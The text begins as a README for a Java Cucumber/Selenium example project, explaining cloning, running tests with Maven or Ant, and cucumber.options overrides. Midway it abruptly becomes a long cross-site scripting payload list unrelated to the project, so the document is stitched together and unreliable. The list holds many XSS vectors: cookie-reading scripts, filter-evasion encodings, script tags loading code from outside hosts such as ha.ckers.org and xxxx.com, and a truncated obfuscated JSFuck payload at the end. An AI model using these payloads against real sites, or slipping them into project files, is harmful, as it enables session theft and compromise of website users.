# java-cucumber-example

A sample project for Cucumber and/or Selenium tests.

# Instructions

Clone the repo:

Git:
```
$ git clone git@github.com:testdouble/java-cucumber-example.git
```

Svn:
```
$ svn co https://github.com/testdouble/java-cucumber-example
```

Or download a ZIP of master [manually](https://github.com/testdouble/java-cucumber-example/archive/master.zip) and expand the contents someplace on your system

## Prerequisites

In order to run browser tests, Selenium will need to be able to drive a browser
installed to your system.

(TODO after testing on Windows)

## Verify installation

## Use Maven

Open a command window and run:

    mvn test

This runs Cucumber features using Cucumber's JUnit runner. The `@RunWith(Cucumber.class)` annotation on the `RunCukesTest`
class tells JUnit to kick off Cucumber.

## Use Ant

Open a command window and run:

    ant download
    ant runcukes

This runs Cucumber features using Cucumber's Command Line Interface (CLI) runner. Note that the `RunCukesTest` junit class is not used at all.
If you remove it (and the `cucumber-junit` jar dependency), it will run just the same.

## Overriding options

The Cucumber runtime parses command line options to know what features to run, where the glue code lives, what plugins to use etc.
When you use the JUnit runner, these options are generated from the `@CucumberOptions` annotation on your test.

Sometimes it can be useful to override these options without changing or recompiling the JUnit class. This can be done with the
`cucumber.options` system property. The general form is:

Using Maven:

    mvn -Dcucumber.options="..." test

Using Ant:

    JAVA_OPTIONS='-Dcucumber.options="..."' ant runcukes

Let's look at some things you can do with `cucumber.options`. Try this:

    -Dcucumber.options="--help"

That should list all the available options.

*IMPORTANT*

When you override options with `-Dcucumber.options`, you will completely override whatever options are hard-coded in
your `@CucumberOptions` or in the script calling `cucumber.api.cli.Main`. There is one exception to this rule, and that
is the `--plugin` option. This will not _override_, but _add_ a plugin. The reason for this is to make it easier
for 3rd party tools (such as [Cucumber Pro](https://cucumber.pro/)) to automatically configure additional plugins by appending arguments to a `cucumber.properties`
file.

### Run a subset of Features or Scenarios

Specify a particular scenario by *line* (and use the pretty plugin, which prints the scenario back)

    -Dcucumber.options="classpath:skeleton/belly.feature:4 --plugin pretty"

This works because Maven puts `./src/test/resources` on your `classpath`.
You can also specify files to run by filesystem path:

    -Dcucumber.options="src/test/resources/skeleton/belly.feature:4 --plugin pretty"

You can also specify what to run by *tag*:

    -Dcucumber.options="--tags @bar --plugin pretty"

### Running only the scenarios that failed in the previous run

    -Dcucumber.options="@target/rerun.txt"

This works as long as you have the `rerun` formatter enabled.

### Specify a different formatter:

For example a JUnit formatter:

    -Dcucumber.options="--plugin junit:target/cucumber-junit-report.xml"
    
<script>alert(1)</script>
IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=javascrscriptipt:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
\";alert('XSS');//
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
�script�alert(�XSS�)�/script�
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="width: expression(alert('XSS'));">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<XSS STYLE="xss:expression(alert('XSS'))">
exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<form id="test" /><button form="test" formaction="javascript:alert(123)">TESTHTML5FORMACTION
<form><button formaction="javascript:alert(123)">crosssitespt
<frameset onload=alert(123)>
<!--<img src="--><img src=x onerror=alert(123)//">
<style><img src="</style><img src=x onerror=alert(123)//">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<embed src="javascript:alert(1)">
<? foo="><script>alert(1)</script>">
<! foo="><script>alert(1)</script>">
</ foo="><script>alert(1)</script>">
<script>({0:#0=alert/#0#/#0#(123)})</script>
<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(123)}),x</script>
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
<script src="#">{alert(1)}</script>;1
<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
<svg xmlns="#"><script>alert(1)</script></svg>
<svg onload="javascript:alert(123)" xmlns="#"></svg>
<iframe xmlns="#" src="javascript:alert(1)"></iframe>
+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
%253cscript%253ealert(document.cookie)%253c/script%253e
�><s�%2b�cript>alert(document.cookie)</script>
�><ScRiPt>alert(document.cookie)</script>
�><<script>alert(document.cookie);//<</script>
foo<script>alert(document.cookie)</script>
<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
%22/%3E%3CBODY%20onload=�document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)�%3E
�; alert(document.cookie); var foo=�
foo\�; alert(document.cookie);//�;
</script><script >alert(document.cookie)</script>
<img src=asdf onerror=alert(document.cookie)>
<BODY ONLOAD=alert(�XSS�)>
<script>alert(1)</script>
"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
><img id=XSS SRC=x onerror=alert(XSS);>
;!--"<XSS>=&{()}"
<IMG id=XSS SRC="javascript:alert('XSS');">
<IMG id=XSS SRC=javascript:alert('XSS')>
<IMG id=XSS SRC=JaVaScRiPt:alert('XSS')>
<IMG id=XSS SRC=javascript:alert("XSS")>
<IMG id=XSS SRC=`javascript:alert("'XSS'")`>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG id=XSS SRC="jav ascript:alert('XSS');">
<IMG id=XSS SRC="jav    ascript:alert('XSS');">
<IMG id=XSS SRC="javascript:alert('XSS');">
<IMG id=XSS SRC="jav
ascript:alert('XSS');">
perl -e 'print "<IMG id=XSS SRC=java\0script:alert(\"XSS\")>";' > out
<IMG id=XSS SRC="  javascript:alert('XSS');">
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<<SCRIPT>alert("XSS");//<</SCRIPT>
\";alert('XSS');//
<IMG id=XSS SRC='javascript:alert('XSS')
<SCRIPT>alert(/XSS/.source)</SCRIPT>
<BODY BACKGROUND="javascript:alert('XSS')">
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<INPUT TYPE="IMAGE" id=XSS SRC="javascript:alert('XSS');">
<BODY ONLOAD=alert('XSS')>
<IMG DYN id=XSS SRC="javascript:alert('XSS')">
<IMG LOW id=XSS SRC="javascript:alert('XSS')">
<BGSOUND id=XSS SRC="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<IMG id=XSS SRC='vbscript:msgbox("XSS")'>
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<TABLE id=XSS BACKGROUND="javascript:alert('XSS')">
<TABLE id=XSS><TD BACKGROUND="javascript:alert('XSS')">
<DIV id=XSS STYLE="background-image: url(javascript:alert('XSS'))">
<DIV id=XSS STYLE="width: expression(alert('XSS'));">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<IFRAME id=XSS SRC="javascript:alert('XSS');"></IFRAME>
<FRAMESET><FRAME id=XSS SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">"
<DIV id=XSS STYLE="background-image: url(javascript:alert('XSS'))">
<DIV id=XSS STYLE="width: expression(alert('XSS'));">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG id=XSS STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<BASE HREF="javascript:alert('XSS');//">
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);
<XML id=XSS><X><C><![CDATA[<IMG id=XSS SRC="javas]]><![CDATA[cript:alert('XSS');">]]></C></X><xml><SPAN DATAid=XSS SRC=#I DATAFLD=CDATAFORMATAS=HTML></SPAN>
<XML ID="XSS"><I><B><IMG id=XSS SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML><SPAN DATAid=XSS SRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<XML id=XSS SRC="xsstest.xml" ID=I></XML><SPAN DATAid=XSS SRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>"></BODY></HTML>
<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
<SCRIPT id=XSS SRC=http://127.0.0.1></SCRIPT>
//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<IMG id=XSS SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG id=XSS SRC="&14;javascript:alert('XSS');">
<SCRIPT <B>=alert('XSS');"></SCRIPT>
<IFRAME id=XSS SRC="javascript:alert('XSS'); <
<SCRIPT>a=/XSS/nalert('XSS');</SCRIPT>
<STYLE>li {list-style-image: url("javascript:alert('XSS');</STYLE><UL><LI>XSS
<DIV STYLE="background-image: url(javascript:alert('XSS'));">
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"></HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<a href="javascript#alert('XSS');">
<div onmouseover="alert('XSS');">,
<input type="image" dynid=XSS SRC="javascript:alert('XSS');">
&<script>alert('XSS');</script>">
<IMG id=XSS SRC=&{alert('XSS');};>
<a id=XSS href="about:<script>alert('XSS');</script>">
<DIV id=XSS STYLE="binding: url(javascript:alert('XSS'));">
<OBJECT classid=clsid:..." codebase="javascript:alert('XSS');">
<style><!--</style><script>alert('XSS');//--></script>
![CDATA[<!--]]<script>alert('XSS');//--></script>
<!-- -- --><script>alert('XSS');</script><!-- -- -->
<img id=XSS SRC="blah"onmouseover="alert('XSS');">
<img id=XSS SRC="blah>"onmouseover="alert('XSS');">
<xml id="X"><a><b><script>alert('XSS');</script>;<b></a></xml>
<div datafld="b" dataformatas="html" dataid=XSS SRC="#XSS"></div>
[\xC0][\xBC]script>alert('XSS');[\xC0][\xBC]/script>
<XML ID=I><X><C><![CDATA[<IMG id=XSS SRC="javas]]<![CDATA[cript:alert('XSS');">]]</C><X></xml>
<form id="test" /><button form="test" formaction="javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))">X
<input id=XSS onfocus=javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
<select id=XSS onfocus=javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
<textarea id=XSS onfocus=javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
<keygen id=XSS onfocus=javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
<input id=XSS onblur=javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus><input autofocus>
<video id=XSS poster=javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))//
<body id=XSS onscroll=eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
<video><source onerror="javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))">
<video onerror="javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))"><source>
<iframe id=XSS / /onload=alert(/XSS/)></iframe>
<iframe id=XSS / "onload=alert(/XSS/)></iframe>
<iframe id=XSS///////onload=alert(/XSS/)></iframe>
<iframe id=XSS "onload=alert(/XSS/)></iframe>
<iframe id=XSS <?php echo chr(11)?> onload=alert(/XSS/)></iframe>
<iframe id=XSS <?php echo chr(12)?> onload=alert(/XSS/)></iframe>
" onfocus=alert(XSS) "> <"
" onblur=alert(XSS) "> <"
" onmouseover=alert(XSS) ">
" onclick=alert(XSS) ">
<FRAMESET><FRAME id=XSS SRC=\"javascript:alert('XSS');\"></FRAMESET>
<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS
</textarea>'"><script>alert(XSS)</script>
'""><script language="JavaScript"> alert('X \nS \nS');</script>
</script></script><<<<script><>>>><<<script>alert(XSS)</script>
<html><noalert><noscript>(XSS)</noscript><script>(XSS)</script>
<INPUT TYPE="IMAGE" id=XSS SRC="javascript:alert('XSS');">
'></select><script>alert(XSS)</script>
}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
<SCRIPT>document.write("XSS");</SCRIPT>
a="get";b="URL";c="javascript:";d="alert('xss');";eval(a+b+c+d);
='><script>alert("xss")</script>
<body background=javascript:'"><script>alert(XSS)</script>></body>
data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=
<SCRIPT>alert('XSS');</SCRIPT>
'';!--"<XSS>=&{()}
<SCRIPT id=XSS SRC=http://xxxx.com/xss.js></SCRIPT>
<IMG id=XSS SRC="javascript:alert('XSS');">
<IMG id=XSS SRC=javascript:alert('XSS')>
<IMG id=XSS SRC=JaVaScRiPt:alert('XSS')>
<IMG id=XSS SRC=javascript:alert("XSS")>
<IMG id=XSS SRC=`javascript:alert("RSnake says, 'XSS'")`>
<IMG id=XSS SRC=javascript:alert(String.fromCharCode(88,83,83))>
id=XSS SRC=<IMG 6;avascript:alert('XSS')>
<IMG id=XSS SRC=javascript:alert('XSS')>
<IMG id=XSS SRC=javascript:alert('XSS')>
<IMG id=XSS SRC="jav ascript:alert('XSS');">
<IMG id=XSS SRC="jav    ascript:alert('XSS');">
<IMG id=XSS SRC="javascript:alert('XSS');">
<IMG id=XSS SRC="jav
ascript:alert('XSS');">
<IMG id=XSS SRC="  javascript:alert('XSS');">
<SCRIPT/XSS id=XSS SRC="http://xxxx.com/xss.js"></SCRIPT>
<SCRIPT id=XSS SRC=http://xxxx.com/xss.js?<B>
<IMG id=XSS SRC="javascript:alert('XSS')"
<SCRIPT>a=/XSS/
\";alert('XSS');//
<INPUT TYPE="IMAGE" id=XSS SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<BODY ONLOAD=alert('XSS')>
<IMG DYNid=XSS SRC="javascript:alert('XSS')">
<IMG LOWid=XSS SRC="javascript:alert('XSS')">
<BGSOUND id=XSS SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LAYER id=XSS SRC="http://xxxx.com/scriptlet.html"></LAYER>
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="http://xxxx.com/xss.css">
<STYLE>@import'http://xxxx.com/xss.css';</STYLE>
<META HTTP-EQUIV="Link" Content="<http://xxxx.com/xss.css>; REL=stylesheet">
<STYLE>BODY{-moz-binding:url("http://xxxx.com/xssmoz.xml#xss")}</STYLE>
<IMG id=XSS SRC='vbscript:msgbox("XSS")'>
<IMG id=XSS SRC="mocha:[code]">
<IMG id=XSS SRC="livescript:[code]">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="Link" Content="<javascript:alert('XSS')>; REL=stylesheet">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<IFRAME id=XSS SRC="javascript:alert('XSS');"></IFRAME>
<FRAMESET><FRAME id=XSS SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<XSS STYLE="xss:expression(alert('XSS'))">
exp/*<XSS STYLE='no\xss:noxss("*//*");
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<BASE HREF="javascript:alert('XSS');//">
<OBJECT TYPE="text/x-scriptlet" DATA="http://xxxx.com/scriptlet.html"></OBJECT>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
getURL("javascript:alert('XSS')")
a="get";
<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG id=XSS SRC="javas<![CDATA[cript:alert('XSS');">
<XML id=XSS SRC="http://xxxx.com/xsstest.xml" ID=I></XML>
<HTML><BODY>
<SCRIPT id=XSS SRC="http://xxxx.com/xss.jpg"></SCRIPT>
<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://xxxx.com/xss.js>'"-->
<? echo('<SCR)';
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<SCRIPT a=">" id=XSS SRC="http://xxxx.com/xss.js"></SCRIPT>
<SCRIPT a=">" '' id=XSS SRC="http://xxxx.com/xss.js"></SCRIPT>
<SCRIPT "a='>'" id=XSS SRC="http://xxxx.com/xss.js"></SCRIPT>
<SCRIPT a=`>` id=XSS SRC="http://xxxx.com/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT id=XSS SRC="http://xxxx.com/xss.js"></SCRIPT>
<sCrIpt>alert(1)</ScRipt>
<iMg srC=1 lAnGuAGE=VbS oNeRroR=mSgbOx(1)>
Null-byte character between HTML attribute name and equal sign (IE, Safari).
<img src='1' onerror\x00=alert(0) />
Slash character between HTML attribute name and equal sign (IE, Firefox, Chrome, Safari).
<img src='1' onerror/=alert(0) />
Vertical tab between HTML attribute name and equal sign (IE, Safari).
<img src='1' onerror\x0b=alert(0) />
Null-byte character between equal sign and JavaScript code (IE).
<img src='1' onerror=\x00alert(0) />
Null-byte character between characters of HTML attribute names (IE).
<img src='1' o\x00nerr\x00or=alert(0) />
Null-byte character before characters of HTML element names (IE).
<\x00img src='1' onerror=alert(0) />
Null-byte character after characters of HTML element names (IE, Safari).
<script\x00>alert(1)</script>
Null-byte character between characters of HTML element names (IE).
<i\x00mg src='1' onerror=alert(0) />
Use slashes instead of whitespace (IE, Firefox, Chrome, Safari).
<img/src='1'/onerror=alert(0)>
Use vertical tabs instead of whitespace (IE, Safari).
<img\x0bsrc='1'\x0bonerror=alert(0)>
Use quotes instead of whitespace in some situations (Safari).
<img src='1''onerror='alert(0)'>
<img src='1'"onerror="alert(0)">
Use null-bytes instead of whitespaces in some situations (IE).
<img src='1'\x00onerror=alert(0)>
Just don't use spaces (IE, Firefox, Chrome, Safari).
<img src='1'onerror=alert(0)>
Prefix URI schemes.
Firefox (\x09, \x0a, \x0d, \x20)
Chrome (Any character \x01 to \x20)
<iframe src="\x01javascript:alert(0)"></iframe> <!-- Example for Chrome -->
No greater-than characters needed (IE, Firefox, Chrome, Safari).
<img src='1' onerror='alert(0)' <
Extra less-than characters (IE, Firefox, Chrome, Safari).
<<script>alert(0)</script>
Backslash character between expression and opening parenthesis (IE).
<style>body{background-color:expression\(alert(1))}</style>
JavaScript Escaping
<script>document.write('<a hr\ef=j\avas\cript\:a\lert(2)>blah</a>');</script>
Encoding Galore.
HTML Attribute Encoding
<img src="1" onerror="alert(1)" />
<img src="1" onerror="alert(1)" />
<iframe src="javascript:alert(1)"></iframe>
<iframe src="javascript:alert(1)"></iframe>
URL Encoding
<iframe src="javascript:alert(1)"></iframe>
<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>
CSS Hexadecimal Encoding (IE specific examples)
<div style="x:expression(alert(1))">Joker</div>
<div style="x:\65\78\70\72\65\73\73\69\6f\6e(alert(1))">Joker</div>
<div style="x:\000065\000078\000070\000072\000065\000073\000073\000069\00006f\00006e(alert(1))">Joker</div>
<div style="x:\65\78\70\72\65\73\73\69\6f\6e\028 alert \028 1 \029 \029">Joker</div>
JavaScript (hexadecimal, octal, and unicode)
<script>document.write('<img src=1 onerror=alert(1)>');</script>
<script>document.write('\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x31\x20\x6F\x6E\x65\x72\x72\x6F\x72\x3D\x61\x6C\x65\x72\x74\x28\x31\x29\x3E');</script>
<script>document.write('\074\151\155\147\040\163\162\143\075\061\040\157\156\145\162\162\157\162\075\141\154\145\162\164\050\061\051\076');</script>
<script>document.write('\u003C\u0069\u006D\u0067\u0020\u0073\u0072\u0063\u003D\u0031\u0020\u006F\u006E\u0065\u0072\u0072\u006F\u0072\u003D\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029\u003E');</script>
JavaScript (Decimal char codes)
<script>document.write('<img src=1 onerror=alert(1)>');</script>
<script>document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,49,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,48,41,62));</script>
JavaScript (Unicode function and variable names)
<script>alert(123)</script>
<script>\u0061\u006C\u0065\u0072\u0074(123)</script>
Overlong UTF-8 (SiteMinder is awesome!)
< = %C0%BC = %E0%80%BC = %F0%80%80%BC
> = %C0%BE = %E0%80%BE = %F0%80%80%BE
' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
<img src="1" onnerror="alert(1)">
%E0%80%BCimg%20src%3D%E0%80%A21%E0%80%A2%20onerror%3D%E0%80%A2alert(1)%E0%80%A2%E0%80%BE
UTF-7 (Missing charset?)
<img src="1" onerror="alert(1)" />
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
Unicode .NET Ugliness
<script>alert(1)</script>
%uff1cscript%uff1ealert(1)%uff1c/script%uff1e
Classic ASP performs some unicode homoglyphic translations... don't ask why...
<img src="1" onerror="alert('1')">
%u3008img%20src%3D%221%22%20onerror%3D%22alert(%uFF071%uFF07)%22%u232A
Useless and/or Useful features.
HTML 5 (Not comphrensive)
<video src="http://www.w3schools.com/html5/movie.ogg" onloadedmetadata="alert(1)" />
<video src="http://www.w3schools.com/html5/movie.ogg" onloadstart="alert(1)" />
Usuage of non-existent elements (IE)
<blah style="blah:expression(alert(1))" />
CSS Comments (IE)
<div style="z:exp/*anything*/res/*here*/sion(alert(1))" />
Alternate ways of executing JavaScript functions
<script>window['alert'](0)</script>
<script>parent['alert'](1)</script>
<script>self['alert'](2)</script>
<script>top['alert'](3)</script>
Split up JavaScript into HTML attributes
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
HTML is parsed before JavaScript
<script>
var junk = '</script><script>alert(1)</script>';
</script>
HTML is parsed before CSS
<style>
body { background-image:url('http://www.blah.com/'); }
</style>
XSS in XML documents [doctype = text/xml] (Firefox, Chrome, Safari).
<?xml version="1.0" ?>
<someElement>
<a xmlns:a='http://www.w3.org/1999/xhtml'><a:body onload='alert(1)'/></a>
</someElement>
URI Schemes
<iframe src="javascript:alert(1)"></iframe>
<iframe src="vbscript:msgbox(1)"></iframe> (IE)
<iframe src="data:text/html,<script>alert(0)</script>"></iframe> (Firefox, Chrome, Safari)
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe> (Firefox, Chrome, Safari)
HTTP Parameter Pollution
http://target.com/something.xxx?a=val1&a=val2
ASP.NET     a = val1,val2
ASP         a = val1,val2
JSP         a = val1
PHP         a = val2
Two Stage XSS via fragment identifier (bypass length restrictions / avoid server logging)
<script>eval(location.hash.slice(1))</script>
<script>eval(location.hash)</script> (Firefox)
http://target.com/something.jsp?inject=<script>eval(location.hash.slice(1))</script>#alert(1)
Two Stage XSS via name attribute
<iframe src="http://target.com/something.jsp?inject=" name="alert(1)"></iframe>
Non-alphanumeric crazyness...
<script>
$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();
</script>
<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]